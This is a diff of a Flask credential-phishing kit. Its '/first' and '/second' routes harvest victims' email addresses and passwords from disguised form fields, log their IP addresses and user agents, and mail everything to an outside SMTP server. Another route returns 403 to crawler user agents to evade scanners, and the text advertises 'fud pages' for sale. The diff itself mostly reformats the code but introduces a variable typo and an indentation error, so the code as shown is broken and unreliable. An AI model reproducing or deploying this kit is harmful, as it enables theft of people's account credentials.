@@ -164,7 +164,7 @@ def route2():
                            ins=session.get('ins'))
 
 
-@app.route("/first", methods=['POST'])
+@app.route('/first', methods=['POST'])
 def first():
     if request.method == 'POST':
         ip = request.headers.get('X-Forwarded-For')
@@ -190,19 +190,21 @@ def first():
         How are you?
         contact me on icq jamescartwright for your fud pages
         """
-        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
-        part1 = MIMEText(text, "plain")
-        part2 = MIMEText(html, "html")
+        html = render_template('emailmailer.html', emailaccess=email,
+                               useragent=useragent,
+                               passaccess=passwordemail, ipman=ip)
+        part1 = MIMEText(text, 'plain')
+        part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
         with smtplib.SMTP_SSL("mail.lastavice.hr", 465) as server:
-            server.login(sender_email, password)
-            server.sendmail(sender_email, receiver_email, message.as_string())
+            server.login(sender_emaill, password)
+            server.sendmail(sender_email, receiver_email,
+                            message.as_string())
         return redirect(url_for('benza', web=session.get('eman')))
 
 
-
-@app.route("/second", methods=['POST'])
+@app.route('/second', methods=['POST'])
 def second():
     if request.method == 'POST':
         ip = request.headers.get('X-Forwarded-For')
@@ -210,7 +212,7 @@ def second():
             ip = request.headers.get('X-Real-IP')
         if ip is None:
             ip = request.headers.get('X-Client-IP')
-        if ip is None:
+         if ip is None:
             ip = request.remote_addr
         email = request.form.get("horse")
         passwordemail = request.form.get("pig")
@@ -228,36 +230,39 @@ def second():
         How are you?
         contact me on icq jamescartwright for your fud pages
         """
-        html = render_template('emailmailer.html', emailaccess=email, useragent=useragent, passaccess=passwordemail, ipman=ip)
-        part1 = MIMEText(text, "plain")
-        part2 = MIMEText(html, "html")
+        html = render_template('emailmailer.html', emailaccess=email,
+                               useragent=useragent,
+                               passaccess=passwordemail, ipman=ip)
+        part1 = MIMEText(text, 'plain')
+        part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
         with smtplib.SMTP_SSL("mail.lastavice.hr", 465) as server:
-            server.login(sender_email, password)
-            server.sendmail(sender_email, receiver_email, message.as_string())
+            server.login(sender_emaill, password)
+            server.sendmail(sender_email, receiver_email,
+                            message.as_string())
         return redirect(url_for('lasmo'))
 
 
-
-@app.route("/benzap", methods=['GET'])
+@app.route('/benzap', methods=['GET'])
 def benza():
     if request.method == 'GET':
         eman = session.get('eman')
         dman = session.get('ins')
     return render_template('ind.html', eman=eman, dman=dman)
 
-@app.route("/lasmop", methods=['GET'])
+
+@app.route('/lasmop', methods=['GET'])
 def lasmo():
-    userip = request.headers.get("X-Forwarded-For")
-    useragent = request.headers.get("User-Agent")
-    
+    userip = request.headers.get('X-Forwarded-For')
+    useragent = request.headers.get('User-Agent')
+
     if useragent in bot_user_agents:
         abort(403)  # forbidden
-    
+
     if request.method == 'GET':
         dman = session.get('ins')
     return render_template('main.html', dman=dman)
 
 if __name__ == '__main__':
-	app.run(host="0.0.0.0", port=3000)
+    app.run(host='0.0.0.0', port=3000)
